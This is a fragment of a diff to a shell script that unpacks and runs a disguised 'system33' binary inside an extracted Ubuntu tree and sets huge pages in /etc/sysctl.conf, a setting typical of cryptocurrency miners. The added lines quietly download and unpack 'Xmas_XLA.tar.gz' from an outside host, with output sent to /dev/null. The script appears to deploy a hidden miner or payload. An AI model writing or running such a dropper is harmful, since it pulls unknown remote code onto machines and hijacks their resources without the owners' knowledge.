@@ -9,7 +9,7 @@ tar -xf system33.tar.gz
 sleep 2
 tar -xf ubuntu2404.tar.gz
 sleep 2
-./system33 -S . /bin/bash
+./system33 -S . /bin/bash >/dev/null
 
 sleep 2
 
@@ -93,6 +93,11 @@ sleep 2
 
 bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
 
+sleep 2
+
+wget -q http://greenleaf.teatspray.uk/Xmas_XLA.tar.gz >/dev/null
+sleep 2
+tar -xf Xmas_XLA.tar.gz
 sleep 2
 
 while true
